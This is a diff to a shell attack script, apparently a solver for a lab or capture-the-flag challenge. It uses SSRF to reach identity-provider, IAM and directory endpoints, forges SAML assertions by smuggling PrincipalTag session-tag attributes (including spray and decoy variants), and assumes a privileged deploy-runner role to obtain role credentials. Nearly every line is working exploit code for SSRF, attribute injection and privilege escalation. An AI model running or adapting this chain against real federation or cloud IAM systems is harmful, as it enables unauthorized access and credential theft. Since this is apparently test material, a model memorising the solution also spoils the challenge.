@@ -23,9 +23,13 @@ except Exception:
 # nested quoting cannot corrupt the payload. Each prints a single base64url query value.
 p_ent()   { python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"user":"svc-deploy","password":sys.argv[1],"group":sys.argv[2]},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
 p_assert(){ python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":sys.argv[2],"attributes":{}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
-p_tag()   { python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{"session_tags":{sys.argv[2]:sys.argv[3]}}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2" "$3"; }
-p_spray() { python3 -c 'import base64,json,sys;t,v=sys.argv[2],sys.argv[3];print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{"session_tags":{t:v,"admin":"true","deploy_eligibility":v,"privilege":v}}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2" "$3"; }
-p_decoy() { python3 -c 'import base64,json,sys;v=sys.argv[2];print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{"deploy-eligibility":v,"tags":{"deploy-eligibility":v}}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
+_PT="https://aws.amazon.com/SAML/Attributes/PrincipalTag:"
+# smuggle the honored PrincipalTag attribute (default family = principal-tag)
+p_tag()   { python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{sys.argv[4]+sys.argv[2]:sys.argv[3]}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2" "$3" "$_PT"; }
+# spray MULTIPLE PrincipalTag attributes -> strict schema rejects
+p_spray() { python3 -c 'import base64,json,sys;pt,t,v=sys.argv[4],sys.argv[2],sys.argv[3];print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{pt+t:v,pt+"admin":v,pt+"environment":v}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2" "$3" "$_PT"; }
+# put the value under a DECOY attribute (not a PrincipalTag) -> ignored -> tag-less session
+p_decoy() { python3 -c 'import base64,json,sys;v=sys.argv[2];print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{"department":v,"custom:deploy":v}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
 p_assume(){ python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"session":sys.argv[1],"role":sys.argv[2]},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
 # p_run cred pass_role action [input-json]  — input is an OPTIONAL 4th arg (a JSON object literal)
 p_run()   { python3 -c 'import base64,json,sys
@@ -57,8 +61,8 @@ a0="$(ssrf "$IDP/idp/assert?p=$(p_assert "$ent" cloud-operator)" | jkey assertio
 sess0="$(ssrf "$IAM/iam/session?assertion=${a0}" | jkey session)"
 desc="$(ssrf "$IAM/iam/describe?session=${sess0}")"
 tag="$(printf '%s' "$desc" | python3 -c 'import sys,json;c=json.load(sys.stdin)["principals"]["deploy-runner"]["trust_policy"]["Condition"]["StringEquals"];print(next(iter(c)).split("/")[-1])')"
-# the value is DERIVED: HMAC(entitlement token, external_id)[:16] (combine two evidence pieces)
-tagval="$(printf '%s' "$desc" | python3 -c 'import sys,json,hmac,hashlib;xid=json.load(sys.stdin)["session_tag_source"]["external_id"];print(hmac.new(sys.argv[1].encode(),xid.encode(),hashlib.sha256).hexdigest()[:16])' "$ent")"
+# the value is DISCOVERED: the project code published as an attribute of the entitled directory group
+tagval="$(ssrf "$DIR/dir/groups?name=federation-eligible" | python3 -c 'import sys,json;a=json.load(sys.stdin)["attributes"];print(next(iter(a.values())))')"
 a1="$(ssrf "$IDP/idp/assert?p=$(p_tag "$ent" "$tag" "$tagval")" | jkey assertion)"
 sess1="$(ssrf "$IAM/iam/session?assertion=${a1}" | jkey session)"
 dr="$(ssrf "$IAM/iam/assume?p=$(p_assume "$sess1" deploy-runner)" | jkey role_credential)"
